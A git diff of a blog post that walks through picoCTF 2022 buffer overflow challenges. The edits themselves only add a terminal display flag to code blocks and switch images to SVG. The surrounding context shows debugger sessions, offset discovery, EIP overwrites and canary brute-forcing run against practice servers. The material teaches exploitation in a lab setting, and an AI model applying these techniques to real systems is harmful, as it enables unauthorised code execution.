@@ -41,7 +41,7 @@ points: 100
 files: '[vuln](asset/pico22/buffer-overflow/vuln-0), [vuln.c](asset/pico22/buffer-overflow/vuln-0.c)'
 {% endchallenge %}
 
-{% ccb caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' html:true %}
+{% ccb caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' html:true terminal:true %}
 <span class="meta prompt_">$ </span> checksec vuln
 [<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-0/vuln&apos;
     Arch:     i386-32-little
@@ -116,7 +116,7 @@ Researching online, a "SIGSEGV" stands for a **segmentation fault**, which is an
 
 We see that on line 40, the horrible `gets()` is called, and reads `buf1` (the user input) onto the stack. This function sucks, as it will write the user's input to the stack without regard to its allocated length. The user can simply overflow this length, and the program will pass their input into the `vuln()` function to trigger a segmentation fault:
 
-{% ccb html:true highlight:3 %}
+{% ccb html:true highlight:3 terminal:true %}
 <span class="meta prompt_">$</span> nc saturn.picoctf.net 65535
 Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa
 picoCTF{ov3rfl0ws_ar3nt_that_bad_<span style="color:#696969"><b>[REDACTED]</b></span>}
@@ -148,7 +148,7 @@ files: '[vuln](asset/pico22/buffer-overflow/vuln-1), [vuln.c](asset/pico22/buffe
 Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
 {% endwarning %}
 
-{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' %}
+{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' terminal:true %}
 <span class="meta prompt_">$ </span>checksec vuln
 [<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-1/vuln&apos;
     Arch:     i386-32-little
@@ -211,7 +211,7 @@ In the `vuln()` function, we see that once again, the `gets()` function is being
 
 Before we get into the code, we need to figure out how to write our own addresses to the stack. Let's start with a visual:
 
-![Stack Visual](/asset/pico22/buffer-overflow/stack-visual.png)
+![Stack Visual](/asset/pico22/buffer-overflow/stack-visual.svg)
 
 Whenever we call a function, multiple items will be "pushed" onto the **top** of the stack (in the diagram, that will be on the right-most side). It will include any parameters, a return address back to `main()`, a base pointer, and a buffer. Note that the stack grows **downwards**, towards lower memory addresses, but the buffer is written **upwards**, towards higher memory addresses.
 
@@ -225,7 +225,7 @@ If we are deliberate of the characters we pass into `gets()`, we will be able to
 
 To start, we first need to figure out our "offset". The offset is the distance, in characters, between the beginning of the buffer and the position of the `$eip`. This can be visualized with the `gdb-gef` utility by setting a breakpoint (a place to pause the runtime) in the `main()` function:
 
-{% ccb html:true caption:'GEF - \"GDB enhanced features\"' url:'gef.readthedocs.io/en/master/' url_text:documentation %}
+{% ccb html:true terminal:true caption:'GEF - \"GDB enhanced features\"' url:'gef.readthedocs.io/en/master/' url_text:documentation %}
 <span style="color:#EC0101"><b>gef➤  </b></span>b main
 Breakpoint 1 at <span style="color:#367BF0">0x80492d7</span>
 <span style="color:#EC0101"><b>gef➤  </b></span>r
@@ -259,7 +259,7 @@ Breakpoint 1, <span style="color:#367BF0">0x080492d7</span> in <span style="colo
 
 Analyzing this breakpoint, if we look at the arrow on the assembly code, we can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:
 
-{% ccb html:true %}
+{% ccb html:true terminal:true %}
 <pre><span style="color:#47D4B9"><b>gef➤  </b></span>r
 Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
 Please enter your string: 
@@ -293,7 +293,7 @@ Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is t
 
 Although we've managed to smash the stack, we still don't know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:
 
-{% ccb html:true %}
+{% ccb html:true terminal:true %}
 <span style="color:#47D4B9"><b>gef➤  </b></span>shell cyclic 48
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
 <span style="color:#47D4B9"><b>gef➤  </b></span>r
@@ -325,7 +325,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 We can see that `$eip` is currently overflowed with the pattern `0x6161616c` (`laaa`). let's search for this pattern using `pattern search`:
 
-{% ccb html:true caption:'GEF pattern command' url:'gef.readthedocs.io/en/master/commands/pattern/' url_text:documentation %}
+{% ccb terminal:true html:true caption:'GEF pattern command' url:'gef.readthedocs.io/en/master/commands/pattern/' url_text:documentation %}
 <span style="color:#47D4B9"><b>gef➤  </b></span>pattern search 0x6161616c
 <span style="color:#277FFF"><b>[+]</b></span> Searching for &apos;0x6161616c&apos;
 <span style="color:#47D4B9"><b>[+]</b></span> Found at offset 44 (little-endian search) <span style="color:#EC0101"><b>likely</b></span>
@@ -334,13 +334,13 @@ We can see that `$eip` is currently overflowed with the pattern `0x6161616c` (`l
 
 To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:
 
-{% ccb html:true caption:'readelf command' url:'man7.org/linux/man-pages/man1/readelf.1.html' url_text:documentation %}
+{% ccb terminal:true html:true caption:'readelf command' url:'man7.org/linux/man-pages/man1/readelf.1.html' url_text:documentation %}
 <span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -h vuln | grep endian</span></span><br><span class="line">  Data: 2&#x27;s complement, little endian</span>
 {% endccb %}
 
 Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the `win()` function, which will be appended to the end of our buffer to overwrite the `$eip` on the stack:
 
-{% ccb html:true caption:'GDB x command' url:'visualgdb.com/gdbreference/commands/x' url_text:documentation %}
+{% ccb terminal:true html:true caption:'GDB x command' url:'visualgdb.com/gdbreference/commands/x' url_text:documentation %}
 <span style="color:#47D4B9"><b>gef➤  </b></span>x win
 <span style="color:#367BF0">0x80491f6</span> &lt;<span style="color:#FEA44C">win</span>&gt;:	0xfb1e0ff3
 {% endccb %}
@@ -368,7 +368,7 @@ p.close()                   # Closes the connection
 
 Let's try running the script on the server:
 
-{% ccb html:true %}
+{% ccb terminal:true html:true %}
 <span class="meta prompt_">$ </span>python3 buffer-overflow-1.py
 [<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
 [<span style="color:#277FFF"><b>*</b></span>] Please enter your string: 
@@ -392,7 +392,7 @@ Info: Many Linux systems do not have core dumps properly configured. For bash, r
 
 Before we start, let's work through the steps with command-line Python. First, let's import the pwntools global namespace and generate an `elf` object using pwntool's `ELF()`:
 
-{% ccb html:true %}
+{% ccb terminal:true html:true %}
 <span class="line"><span class="meta prompt_">$ </span>python3 -q</span><br><span class="meta prompt_">>>></span> from pwn import *
 <span class="meta prompt_">>>></span> elf = context.binary = ELF('./vuln')
 [<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
@@ -406,7 +406,7 @@ Before we start, let's work through the steps with command-line Python. First, l
 
 We can then generate a `cyclic()` payload and start a local process referencing the aforementioned `elf` object. Sending the payload and using the [`.wait()`](https://www.educba.com/python-wait/) method will throw an exit code -11, which signals a segmentation fault and generates a core dump. 
 
-{% ccb html:true wrapped:true %}
+{% ccb terminal:true html:true wrapped:true %}
 <span class="meta prompt_">>>></span> p = process(elf.path)
 [<span style="color:#9755B3">x</span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
 [<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2219
@@ -426,7 +426,7 @@ drwxr-xr-x 16 kali kali    4096 Jun 14 17:13 <span style="color:#277FFF"><b>..</
 
 We can now create a corefile object and freely reference registers! To find the offset, we can simply call the object key within `cyclic_find()`.
 
-{% ccb html:true wrapped:true %}
+{% ccb terminal:true html:true wrapped:true %}
 <span class="meta prompt_">>>></span> core = Corefile('./core')
 [<span style="color:#9755B3">x</span>] Parsing corefile...
 [<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
@@ -473,7 +473,7 @@ p.interactive()    # receives flag
 
 Let's run the script on the server:
 
-{% ccb html:true wrapped:true %}
+{% ccb html:true wrapped:true terminal:true %}
 <span class="meta prompt_">$ </span>python3 buffer-overflow-1-automated.py REMOTE
 [<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2601
 [<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2601)
@@ -519,7 +519,7 @@ files: '[vuln](asset/pico22/buffer-overflow/vuln-2), [vuln.c](asset/pico22/buffe
 Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
 {% endwarning %}
 
-{% ccb caption:checksec.sh url:github.com/slimm609/checksec.sh url_text:'github link' html:true %}
+{% ccb caption:checksec.sh url:github.com/slimm609/checksec.sh url_text:'github link' html:true terminal:true %}
 <span class="meta prompt_">$ </span>checksec vuln
 [<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
     Arch:     i386-32-little
@@ -594,7 +594,7 @@ The goal is simple: call `win(0xCAFEF00D, 0xF00DF00D)`! We'll be doing it the ha
 
 We can apply a lot from what we learned in `Buffer overflow 1`. The first thing we should do is find the offset, which requires no hassle with pwntools helpers! Although we'll get actual number here, I won't include it in the final script for the sake of not leaving out any steps. Simply segfault the process with a cyclic string, read the core dump's fault address (`$eip`) and throw it into `cyclic_find()`:
 
-{% ccb html:true wrapped:true %}
+{% ccb html:true wrapped:true terminal:true %}
 <span class="meta prompt_">$ </span>python3 -q
 <span class="meta prompt_">>>> </span>from pwn import *
 <span class="meta prompt_">>>> </span>elf = context.binary = ELF(&apos;./vuln&apos;)
@@ -659,7 +659,7 @@ p.interactive()
 
 Let's run it on the remote server:
 
-{% ccb html:true wrapped:true %}
+{% ccb html:true wrapped:true terminal:true %}
 <span class="meta prompt_">$ </span>python3 buffer-overflow-2.py REMOTE
 [<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 3988
 [<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
@@ -709,7 +709,7 @@ p.interactive()
 
 Let's run it on the remote server:
 
-{% ccb html:true wrapped:true %}
+{% ccb html:true wrapped:true terminal:true %}
 <span class="meta prompt_">$ </span>python3 buffer-overflow-2-automated.py REMOTE
 [<span style="color:#277FFF"><b>*</b></span>] Loaded 10 cached gadgets for &apos;./vuln&apos;
 [<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 4993
@@ -756,7 +756,7 @@ files: '[vuln](asset/pico22/buffer-overflow/vuln-3), [vuln.c](asset/pico22/buffe
 Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
 {% endwarning %}
 
-{% ccb caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' html:true %}
+{% ccb caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' html:true terminal:true %}
 <span class="meta prompt_">$ </span>checksec vuln
 [<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
     Arch:     i386-32-little
@@ -867,11 +867,11 @@ Knowing that the canary will be four bytes long (defined by `CANARY_SIZE`) and i
 
 This uses `memcmp()` to determine if the current canary is the same as the global canary. If it's different, then the program will run `exit(-1)`, which is a really weird/invalid exit code and supposedly represents "[abnormal termination](https://softwareengineering.stackexchange.com/questions/314563/where-did-exit-1-come-from)":
 
-![memcmp1](/asset/pico22/buffer-overflow/memcmp1.png)
+![memcmp1](/asset/pico22/buffer-overflow/memcmp1.svg)
 
 However, if we theoretically overwrite the canary with a single correct byte, `memcmp()` won't detect anything!:
 
-![memcmp2](/asset/pico22/buffer-overflow/memcmp2.png)
+![memcmp2](/asset/pico22/buffer-overflow/memcmp2.svg)
 
 ### II: Bypassing the Canary 💨
 
@@ -895,7 +895,7 @@ def new_process(): # Specify remote or local instance with CLI argument
 
 Here's the big part: the `get_canary()` function. I'll be using [`pwnlib.log`](https://docs.pwntools.com/en/stable/log.html) for some spicy status messages. My general process for the brute force is visualized here if you're having trouble:
 
-![Brute Force Visual](/asset/pico22/buffer-overflow/brute-visual.png)
+![Brute Force Visual](/asset/pico22/buffer-overflow/brute-visual.svg)
 
 I'll be initially sending 64 + 1 bytes, and slowly appending the correct canary to the end of my payload until the loop has completed four times:
 
@@ -922,7 +922,7 @@ The final thing we need to figure out is the offset between the canary to `$eip`
 
 (Note: My canary is "abcd" because I put that in my `canary.txt`. It will be different on the remote!)
 
-{% ccb html:true wrapped:true %}
+{% ccb html:true wrapped:true terminal:true %}
 <span class="meta prompt_">$ </span>python3 -q
 <span class="meta prompt_">>>></span> from pwn import *
 <span class="meta prompt_">>>></span> p = process('./vuln')
@@ -959,7 +959,7 @@ log.success(p.recvall().decode("ISO-8859-1")) # recvallS() didn't work :(
 
 Since I segmented my script into parts, I decided against putting a giant codeblock here with the same code as earlier. Instead, I just put it on a [Gist](https://gist.github.com/jktrn/bafbc08bbee179588207e3e3caffde75)! Anyways, here's the full script in action:
 
-{% ccb html:true wrapped:true %}
+{% ccb html:true wrapped:true terminal:true %}
 <span class="meta prompt_">$ </span>python3 buffer-overflow-3.py
 [<span style="color:#47D4B9"><b>+</b></span>] Finding canary: 'BiRd'
 [<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 57427: Done
